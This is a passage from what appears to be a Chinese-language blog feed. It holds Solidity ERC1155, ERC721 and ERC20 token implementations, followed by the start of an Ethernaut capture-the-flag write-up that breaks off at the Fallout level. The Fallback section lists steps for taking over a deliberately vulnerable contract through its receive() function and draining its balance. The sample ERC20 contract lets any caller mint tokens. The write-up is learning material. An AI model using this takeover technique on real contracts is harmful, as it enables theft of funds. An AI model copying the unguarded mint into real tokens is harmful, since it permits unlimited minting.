class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.20;<br><br>contract ERC1155 is IERC1155 &#123;<br>    event TransferSingle(<br>        address indexed operator,<br>        address indexed from,<br>        address indexed to,<br>        uint256 id,<br>        uint256 value<br>    );<br>    event TransferBatch(<br>        address indexed operator,<br>        address indexed from,<br>        address indexed to,<br>        uint256[] ids,<br>        uint256[] values<br>    );<br>    event ApprovalForAll(<br>        address indexed owner,<br>        address indexed operator,<br>        bool approved<br>    );<br>    event URI(string value, uint256 indexed id);<br><br>    // owner =&gt; id =&gt; balance<br>    mapping(address =&gt; mapping(uint256 =&gt; uint256)) public balanceOf;<br>    // owner =&gt; operator =&gt; approved<br>    mapping(address =&gt; mapping(address =&gt; bool)) public isApprovedForAll;<br><br>    function balanceOfBatch(<br>        address[] calldata owners,<br>        uint256[] calldata ids<br>    ) external view returns (uint256[] memory balances) &#123;<br>        require(owners.length == ids.length, &quot;owners length != ids length&quot;);<br><br>        balances = new uint[](owners.length);<br><br>        unchecked &#123;<br>            for (uint256 i = 0; i &lt; owners.length; i++) &#123;<br>                balances[i] = balanceOf[owners[i]][ids[i]];<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    function setApprovalForAll(address operator, bool approved) external &#123;<br>        isApprovedForAll[msg.sender][operator] = approved;<br>        emit ApprovalForAll(msg.sender, operator, approved);<br>    &#125;<br><br>    function safeTransferFrom(<br>        address from,<br>        address to,<br>        uint256 id,<br>        uint256 value,<br>        bytes calldata data<br>    ) external &#123;<br>        require(<br>            msg.sender == from || isApprovedForAll[from][msg.sender],<br>            &quot;not approved&quot;<br>        );<br>        require(to != address(0), &quot;to = 0 address&quot;);<br><br>        balanceOf[from][id] -= value;<br>        balanceOf[to][id] += value;<br><br>        emit TransferSingle(msg.sender, from, to, id, value);<br><br>        if (to.code.length &gt; 0) &#123;<br>            require(<br>                IERC1155TokenReceiver(to).onERC1155Received(<br>                    msg.sender,<br>                    from,<br>                    id,<br>                    value,<br>                    data<br>                ) == IERC1155TokenReceiver.onERC1155Received.selector,<br>                &quot;unsafe transfer&quot;<br>            );<br>        &#125;<br>    &#125;<br><br>    function safeBatchTransferFrom(<br>        address from,<br>        address to,<br>        uint256[] calldata ids,<br>        uint256[] calldata values,<br>        bytes calldata data<br>    ) external &#123;<br>        require(<br>            msg.sender == from || isApprovedForAll[from][msg.sender],<br>            &quot;not approved&quot;<br>        );<br>        require(to != address(0), &quot;to = 0 address&quot;);<br>        require(ids.length == values.length, &quot;ids length != values length&quot;);<br><br>        for (uint256 i = 0; i &lt; ids.length; i++) &#123;<br>            balanceOf[from][ids[i]] -= values[i];<br>            balanceOf[to][ids[i]] += values[i];<br>        &#125;<br><br>        emit TransferBatch(msg.sender, from, to, ids, values);<br><br>        if (to.code.length &gt; 0) &#123;<br>            require(<br>                IERC1155TokenReceiver(to).onERC1155BatchReceived(<br>                    msg.sender,<br>                    from,<br>                    ids,<br>                    values,<br>                    data<br>                ) == IERC1155TokenReceiver.onERC1155BatchReceived.selector,<br>                &quot;unsafe transfer&quot;<br>            );<br>        &#125;<br>    &#125;<br><br>    // ERC165<br>    function supportsInterface(bytes4 interfaceId) external view returns (bool) &#123;<br>        return<br>            interfaceId == 0x01ffc9a7 || // ERC165 Interface ID for ERC165<br>            interfaceId == 0xd9b67a26 || // ERC165 Interface ID for ERC1155<br>            interfaceId == 0x0e89341c; // ERC165 Interface ID for ERC1155MetadataURI<br>    &#125;<br><br>    // ERC1155 Metadata URI<br>    function uri(uint256 id) public view virtual returns (string memory) &#123;&#125;<br><br>    // Internal functions<br>    function _mint(address to, uint256 id, uint256 value, bytes memory data) internal &#123;<br>        require(to != address(0), &quot;to = 0 address&quot;);<br><br>        balanceOf[to][id] += value;<br><br>        emit TransferSingle(msg.sender, address(0), to, id, value);<br><br>        if (to.code.length &gt; 0) &#123;<br>            require(<br>                IERC1155TokenReceiver(to).onERC1155Received(<br>                    msg.sender,<br>                    address(0),<br>                    id,<br>                    value,<br>                    data<br>                ) == IERC1155TokenReceiver.onERC1155Received.selector,<br>                &quot;unsafe transfer&quot;<br>            );<br>        &#125;<br>    &#125;<br><br>    function _batchMint(<br>        address to,<br>        uint256[] calldata ids,<br>        uint256[] calldata values,<br>        bytes calldata data<br>    ) internal &#123;<br>        require(to != address(0), &quot;to = 0 address&quot;);<br>        require(ids.length == values.length, &quot;ids length != values length&quot;);<br><br>        for (uint256 i = 0; i &lt; ids.length; i++) &#123;<br>            balanceOf[to][ids[i]] += values[i];<br>        &#125;<br><br>        emit TransferBatch(msg.sender, address(0), to, ids, values);<br><br>        if (to.code.length &gt; 0) &#123;<br>            require(<br>                IERC1155TokenReceiver(to).onERC1155BatchReceived(<br>                    msg.sender,<br>                    address(0),<br>                    ids,<br>                    values,<br>                    data<br>                ) == IERC1155TokenReceiver.onERC1155BatchReceived.selector,<br>                &quot;unsafe transfer&quot;<br>            );<br>        &#125;<br>    &#125;<br><br>    function _burn(address from, uint256 id, uint256 value) internal &#123;<br>        require(from != address(0), &quot;from = 0 address&quot;);<br>        balanceOf[from][id] -= value;<br>        emit TransferSingle(msg.sender, from, address(0), id, value);<br>    &#125;<br><br>    function _batchBurn(<br>        address from,<br>        uint256[] calldata ids,<br>        uint256[] calldata values<br>    ) internal &#123;<br>        require(from != address(0), &quot;from = 0 address&quot;);<br>        require(ids.length == values.length, &quot;ids length != values length&quot;);<br><br>        for (uint256 i = 0; i &lt; ids.length; i++) &#123;<br>            balanceOf[from][ids[i]] -= values[i];<br>        &#125;<br><br>        emit TransferBatch(msg.sender, from, address(0), ids, values);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span c</summary>
      
    
    
    
    
    <category term="Ethereum" scheme="http://lexlady.top/tags/Ethereum/"/>
    
  </entry>
  
  <entry>
    <title>ERC721</title>
    <link href="http://lexlady.top/2023/03/12/ERC721/"/>
    <id>http://lexlady.top/2023/03/12/ERC721/</id>
    <published>2023-03-12T14:33:51.000Z</published>
    <updated>2023-11-12T17:41:16.691Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs solidity">interface IERC165 &#123;<br>    function supportsInterface(bytes4 interfaceID) external view returns (bool);<br>&#125;<br><br>interface IERC721 is IERC165 &#123;<br>    function balanceOf(address owner) external view returns (uint balance);<br><br>    function ownerOf(uint tokenId) external view returns (address owner);<br><br>    function safeTransferFrom(address from, address to, uint tokenId) external;<br><br>    function safeTransferFrom(<br>        address from,<br>        address to,<br>        uint tokenId,<br>        bytes calldata data<br>    ) external;<br><br>    function transferFrom(address from, address to, uint tokenId) external;<br><br>    function approve(address to, uint tokenId) external;<br><br>    function getApproved(uint tokenId) external view returns (address operator);<br><br>    function setApprovalForAll(address operator, bool _approved) external;<br><br>    function isApprovedForAll(<br>        address owner,<br>        address operator<br>    ) external view returns (bool);<br>&#125;<br><br>interface IERC721Receiver &#123;<br>    function onERC721Received(<br>        address operator,<br>        address from,<br>        uint tokenId,<br>        bytes calldata data<br>    ) external returns (bytes4);<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.20;<br><br>contract ERC721 is IERC721 &#123;<br>    event Transfer(address indexed from, address indexed to, uint indexed id);<br>    event Approval(address indexed owner, address indexed spender, uint indexed id);<br>    event ApprovalForAll(<br>        address indexed owner,<br>        address indexed operator,<br>        bool approved<br>    );<br><br>    // Mapping from token ID to owner address<br>    mapping(uint =&gt; address) internal _ownerOf;<br><br>    // Mapping owner address to token count<br>    mapping(address =&gt; uint) internal _balanceOf;<br><br>    // Mapping from token ID to approved address<br>    mapping(uint =&gt; address) internal _approvals;<br><br>    // Mapping from owner to operator approvals<br>    mapping(address =&gt; mapping(address =&gt; bool)) public isApprovedForAll;<br><br>    function supportsInterface(bytes4 interfaceId) external pure returns (bool) &#123;<br>        return<br>            interfaceId == type(IERC721).interfaceId ||<br>            interfaceId == type(IERC165).interfaceId;<br>    &#125;<br><br>    function ownerOf(uint id) external view returns (address owner) &#123;<br>        owner = _ownerOf[id];<br>        require(owner != address(0), &quot;token doesn&#x27;t exist&quot;);<br>    &#125;<br><br>    function balanceOf(address owner) external view returns (uint) &#123;<br>        require(owner != address(0), &quot;owner = zero address&quot;);<br>        return _balanceOf[owner];<br>    &#125;<br><br>    function setApprovalForAll(address operator, bool approved) external &#123;<br>        isApprovedForAll[msg.sender][operator] = approved;<br>        emit ApprovalForAll(msg.sender, operator, approved);<br>    &#125;<br><br>    function approve(address spender, uint id) external &#123;<br>        address owner = _ownerOf[id];<br>        require(<br>            msg.sender == owner || isApprovedForAll[owner][msg.sender],<br>            &quot;not authorized&quot;<br>        );<br><br>        _approvals[id] = spender;<br><br>        emit Approval(owner, spender, id);<br>    &#125;<br><br>    function getApproved(uint id) external view returns (address) &#123;<br>        require(_ownerOf[id] != address(0), &quot;token doesn&#x27;t exist&quot;);<br>        return _approvals[id];<br>    &#125;<br><br>    function _isApprovedOrOwner(<br>        address owner,<br>        address spender,<br>        uint id<br>    ) internal view returns (bool) &#123;<br>        return (spender == owner ||<br>            isApprovedForAll[owner][spender] ||<br>            spender == _approvals[id]);<br>    &#125;<br><br>    function transferFrom(address from, address to, uint id) public &#123;<br>        require(from == _ownerOf[id], &quot;from != owner&quot;);<br>        require(to != address(0), &quot;transfer to zero address&quot;);<br><br>        require(_isApprovedOrOwner(from, msg.sender, id), &quot;not authorized&quot;);<br><br>        _balanceOf[from]--;<br>        _balanceOf[to]++;<br>        _ownerOf[id] = to;<br><br>        delete _approvals[id];<br><br>        emit Transfer(from, to, id);<br>    &#125;<br><br>    function safeTransferFrom(address from, address to, uint id) external &#123;<br>        transferFrom(from, to, id);<br><br>        require(<br>            to.code.length == 0 ||<br>                IERC721Receiver(to).onERC721Received(msg.sender, from, id, &quot;&quot;) ==<br>                IERC721Receiver.onERC721Received.selector,<br>            &quot;unsafe recipient&quot;<br>        );<br>    &#125;<br><br>    function safeTransferFrom(<br>        address from,<br>        address to,<br>        uint id,<br>        bytes calldata data<br>    ) external &#123;<br>        transferFrom(from, to, id);<br><br>        require(<br>            to.code.length == 0 ||<br>                IERC721Receiver(to).onERC721Received(msg.sender, from, id, data) ==<br>                IERC721Receiver.onERC721Received.selector,<br>            &quot;unsafe recipient&quot;<br>        );<br>    &#125;<br><br>    function _mint(address to, uint id) internal &#123;<br>        require(to != address(0), &quot;mint to zero address&quot;);<br>        require(_ownerOf[id] == address(0), &quot;already minted&quot;);<br><br>        _balanceOf[to]++;<br>        _ownerOf[id] = to;<br><br>        emit Transfer(address(0), to, id);<br>    &#125;<br><br>    function _burn(uint id) internal &#123;<br>        address owner = _ownerOf[id];<br>        require(owner != address(0), &quot;not minted&quot;);<br><br>        _balanceOf[owner] -= 1;<br><br>        delete _ownerOf[id];<br>        delete _approvals[id];<br><br>        emit Transfer(owner, address(0), id);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span c</summary>
      
    
    
    
    
    <category term="Ethereum" scheme="http://lexlady.top/tags/Ethereum/"/>
    
  </entry>
  
  <entry>
    <title>ERC20</title>
    <link href="http://lexlady.top/2023/03/12/ERC20/"/>
    <id>http://lexlady.top/2023/03/12/ERC20/</id>
    <published>2023-03-12T13:33:39.000Z</published>
    <updated>2023-11-12T17:38:40.354Z</updated>
    
    <content type="html"><![CDATA[<p>ERC20是一种代币标准，它主要提供了两种转账方式：transfer、transferFrom。为以太坊上的代币合约提供了一个标准化的方案，也对以太坊上数字经济的实现进行了一定的规范。</p><p>下面是<strong>ERC20的接口</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.20;<br><br>// https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/token/ERC20/IERC20.sol<br>interface IERC20 &#123;<br>    function totalSupply() external view returns (uint);<br><br>    function balanceOf(address account) external view returns (uint);<br><br>    function transfer(address recipient, uint amount) external returns (bool);<br><br>    function allowance(address owner, address spender) external view returns (uint);<br><br>    function approve(address spender, uint amount) external returns (bool);<br><br>    function transferFrom(<br>        address sender,<br>        address recipient,<br>        uint amount<br>    ) external returns (bool);<br><br>    event Transfer(address indexed from, address indexed to, uint value);<br>    event Approval(address indexed owner, address indexed spender, uint value);<br>&#125;<br></code></pre></td></tr></table></figure><p>现在我们就一一对各个方法及事件进行介绍：</p><ul><li>totalSupply()<br>  代币发行总量，</li><li>balanceOf(address account)<br>  对某个账户进行余额查询</li><li>transfer(address recipient, uint amount)<br>  由交易发起者向另一个账户地址进行转账。</li><li>approve(address spender, uint amount)<br>  设置允许某个账户spender能够从发起者地址中使用的代币数量</li><li>allowance(address owner, address spender)<br>  查询某个地址spender可以从owner中使用的代币数量</li><li>transferFrom(address sender, address recipient, uint amount)<br>  能够实现非自己账户间的代币交易。</li></ul><p>两个事件：</p><ul><li>Transfer(address indexed from, address indexed to, uint value)<br>  在每次进行代币交易成功时会触发，描述这笔交易的发起着，接受着以及金额。</li><li>Approval(address indexed owner, address indexed spender, uint value)<br>  在调用approve()函数时触发，描述代币授权的拥有者，接受者以及金额</li></ul><p>除了上述的主要方法外，建议在使用ERC20时实现name decimals symbol这三个状态变量。</p><p>他们分别代表这个代币的名称、精度、代币简称。</p><p>下面就是一个标准的ERC20 token合约：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.20;<br><br>import &quot;./IERC20.sol&quot;;<br><br>contract ERC20 is IERC20 &#123;<br>    uint public totalSupply;<br>    mapping(address =&gt; uint) public balanceOf;<br>    mapping(address =&gt; mapping(address =&gt; uint)) public allowance;<br>    string public name = &quot;Solidity by Example&quot;;<br>    string public symbol = &quot;SOLBYEX&quot;;<br>    uint8 public decimals = 18;<br><br>    function transfer(address recipient, uint amount) external returns (bool) &#123;<br>        balanceOf[msg.sender] -= amount;<br>        balanceOf[recipient] += amount;<br>        emit Transfer(msg.sender, recipient, amount);<br>        return true;<br>    &#125;<br><br>    function approve(address spender, uint amount) external returns (bool) &#123;<br>        allowance[msg.sender][spender] = amount;<br>        emit Approval(msg.sender, spender, amount);<br>        return true;<br>    &#125;<br><br>    function transferFrom(<br>        address sender,<br>        address recipient,<br>        uint amount<br>    ) external returns (bool) &#123;<br>        allowance[sender][msg.sender] -= amount;<br>        balanceOf[sender] -= amount;<br>        balanceOf[recipient] += amount;<br>        emit Transfer(sender, recipient, amount);<br>        return true;<br>    &#125;<br><br>    function mint(uint amount) external &#123;<br>        balanceOf[msg.sender] += amount;<br>        totalSupply += amount;<br>        emit Transfer(address(0), msg.sender, amount);<br>    &#125;<br><br>    function burn(uint amount) external &#123;<br>        balanceOf[msg.sender] -= amount;<br>        totalSupply -= amount;<br>        emit Transfer(msg.sender, address(0), amount);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>函数<code>mint、burn</code>分别为代币增发、代币销毁的功能。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ERC20是一种代币标准，它主要提供了两种转账方式：transfer、transferFrom。为以太坊上的代币合约提供了一个标准化的方案，也对以太坊上数字经济的实现进行了一定的规范。&lt;/p&gt;
&lt;p&gt;下面是&lt;strong&gt;ERC20的接口&lt;/strong&gt;：&lt;/p&gt;
&lt;fi</summary>
      
    
    
    
    
    <category term="Ethereum" scheme="http://lexlady.top/tags/Ethereum/"/>
    
  </entry>
  
  <entry>
    <title>Ethernaut</title>
    <link href="http://lexlady.top/2023/02/25/Ether/"/>
    <id>http://lexlady.top/2023/02/25/Ether/</id>
    <published>2023-02-25T12:44:02.000Z</published>
    <updated>2023-11-11T18:12:41.835Z</updated>
    
    <content type="html"><![CDATA[<p>此文章会记录在Ethernaut上经历的题。</p><span id="more"></span><h1 id="Hello-Ethernaut"><a href="#Hello-Ethernaut" class="headerlink" title="Hello Ethernaut"></a>Hello Ethernaut</h1><p>在第一题中，我们会跟着引导通过web终端进行操作，基本上没什么难度，一步步地按照提示来做就行。<del>你甚至可以通过直接查看合约ABI来推断出答案，实在是太友好了！！</del><br>收获：  </p><ul><li>关键字的使用</li><li>各种变量的存储位置</li></ul><hr><h1 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h1><p>任务要求：获取合约的所有权；将余额减为零<br><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Fallback &#123;<br><br>  mapping(address =&gt; uint) public contributions;<br>  address public owner;<br><br>  constructor() &#123;<br>    owner = msg.sender;<br>    contributions[msg.sender] = 1000 * (1 ether);<br>  &#125;<br><br>  modifier onlyOwner &#123;<br>        require(<br>            msg.sender == owner,<br>            &quot;caller is not the owner&quot;<br>        );<br>        _;<br>    &#125;<br><br>  function contribute() public payable &#123;<br>    require(msg.value &lt; 0.001 ether);<br>    contributions[msg.sender] += msg.value;<br>    if(contributions[msg.sender] &gt; contributions[owner]) &#123;<br>      owner = msg.sender;<br>    &#125;<br>  &#125;<br><br>  function getContribution() public view returns (uint) &#123;<br>    return contributions[msg.sender];<br>  &#125;<br><br>  function withdraw() public onlyOwner &#123;<br>    payable(owner).transfer(address(this).balance);<br>  &#125;<br><br>  receive() external payable &#123;<br>    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);<br>    owner = msg.sender;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">receive() external payable &#123;<br>  require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);<br>  owner = msg.sender;<br>&#125;<br></code></pre></td></tr></table></figure><p>要求我们获取合约的所有权就不需要通过另外的攻击合约来进行攻击只需要调用合约内方法进行实现，因此我们可以通过标记owner变量快速查询有关owner的代码。</p><p>在receive方法中我们能够更改owner，在此之前需要我们在contributions中有一点余额，这只需要执行contribute方法就能实现。</p><p>解题参考：<br>1）执行实例中的contribute方法，向合约发送最多0.001ether。<br>2）向合约发送以太，触发receive方法。<br>3）执行实例中的withdraw方法</p><blockquote><p>receive方法</p><ul><li>一个合约至多含有一个receive()函数,</li><li>没有function关键字、没有参数，没有返回值</li><li>可见性必须声明为external，必须含有payable关键字</li><li>允许使用modifier修改器</li></ul><p>当本合约收到ether但并未被调用任何函数，未接受任何数据，receive函数被触发，执行ether的传输（类似于基本的send(),transfer()函数）；如果合约中不存在此类方法，但拥有一个可支付的回退函数将触发回退函数执行ether的操作；如果都不存在，那么合约将不能接受ether并抛出异常</p><p>选自<a href="https://docs.soliditylang.org/en/v0.8.13/contracts.html#receive-ether-function">solidity官方文档v0.8.13</a></p></blockquote><hr><h1 id="Fallout"><a href="#Fallout" class="headerlink" title="Fallout"></a>Fallout</h1><p>任务要求：获取合约的所有权<del>卖眼镜的做的题</del><br><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 